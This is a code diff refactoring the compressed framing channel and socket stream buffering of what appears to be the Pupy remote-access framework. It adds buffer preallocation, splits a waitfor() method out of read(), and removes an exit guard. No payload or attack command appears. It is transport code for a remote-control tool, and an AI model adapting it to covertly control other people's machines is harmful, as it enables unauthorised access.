@@ -68,8 +68,9 @@ class PupyChannel(Channel):
 
         length, compressed = self.FRAME_HEADER.unpack(header)
 
-        data = []
         required_length = length + len(self.FLUSHER)
+
+        data = []
         decompressor = None
 
         if compressed:
@@ -108,6 +109,8 @@ class PupyChannel(Channel):
         portion = None
         lportion = 0
 
+        # print "SEND .. ", ldata, data[:64].encode('hex')
+
         if self.compress and ldata > self.COMPRESSION_THRESHOLD:
             portion = data[:self.COMPRESSION_THRESHOLD]
             portion = zlib.compress(portion)
@@ -140,10 +143,6 @@ class PupyChannel(Channel):
             portion = compressor.compress(cdata)
             lportion = len(portion)
 
-            if rest < 0:
-                import os
-                os._exit(-1)
-
             if lportion > 0:
                 total_length += lportion
                 self.stream.write(portion, notify=False)
@@ -157,15 +156,17 @@ class PupyChannel(Channel):
         del portion, data, cdata
 
         self.stream.insert(self.FRAME_HEADER.pack(total_length, compressed))
+        #print "SEND WITH TOTAL LENGTH", total_length
         self.stream.write(self.FLUSHER)
 
 class PupySocketStream(SocketStream):
     def __init__(self, sock, transport_class, transport_kwargs):
         super(PupySocketStream, self).__init__(sock)
 
-        #buffers for streams
-        self.buf_in=Buffer()
-        self.buf_out=Buffer()
+        self.MAX_IO_CHUNK = 32000
+        self.KEEP_ALIVE_REQUIRED = False
+        self.compress = True
+
         #buffers for transport
         self.upstream=Buffer(transport_func=addGetPeer(("127.0.0.1", 443)))
 
@@ -177,6 +178,7 @@ class PupySocketStream(SocketStream):
             peername = sock.getpeername()
 
         self.downstream = Buffer(
+            preallocate=self.MAX_IO_CHUNK,
             on_write=self._upstream_recv,
             transport_func=addGetPeer(peername))
 
@@ -185,9 +187,9 @@ class PupySocketStream(SocketStream):
 
         self.transport = transport_class(self, **transport_kwargs)
 
-        self.MAX_IO_CHUNK = 32000
-        self.KEEP_ALIVE_REQUIRED = False
-        self.compress = True
+        #buffers for streams
+        self.buf_in=Buffer(preallocate=self.MAX_IO_CHUNK)
+        self.buf_out=Buffer(preallocate=self.MAX_IO_CHUNK)
 
         self.on_connect()
 
@@ -251,13 +253,13 @@ class PupySocketStream(SocketStream):
         if len(self.downstream)>0:
             self.downstream.write_to(super(PupySocketStream, self))
 
-    def read(self, count):
+    def waitfor(self, count):
         try:
             while len(self.upstream)<count:
                 if not self.sock_poll(None) and self.closed:
                     return None
 
-            return self.upstream.read(count)
+            return self.upstream
 
         except (EOFError, socket.error):
             self.close()
@@ -267,6 +269,9 @@ class PupySocketStream(SocketStream):
             logging.debug(traceback.format_exc())
             self.close()
             raise
+
+    def read(self, count):
+        return self.waitfor(count).read(count)
 
     def insert(self, data):
         with self.upstream_lock:
